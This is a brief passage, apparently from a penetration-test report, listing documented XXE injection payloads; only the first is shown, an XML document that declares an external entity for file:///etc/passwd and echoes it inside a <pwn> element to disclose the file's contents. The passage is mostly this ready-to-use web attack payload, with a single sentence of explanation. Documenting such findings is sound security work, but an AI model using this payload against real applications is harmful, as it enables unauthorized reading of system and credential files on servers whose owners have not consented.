# Documented XXE Payloads

The following payloads were validated against the target application to confirm the presence of the XML External Entity injection vulnerability.

### Payload 1: Local File Disclosure (In-Band)
This payload attempts to read the contents of the local `/etc/passwd` file by defining it as a system entity and referencing it inside the `<pwn>` tag.


<?xml version="1.0"?>
<!DOCTYPE XXE [
  <!ENTITY password SYSTEM "file:///etc/passwd">
]>
<pwn>&password;</pwn>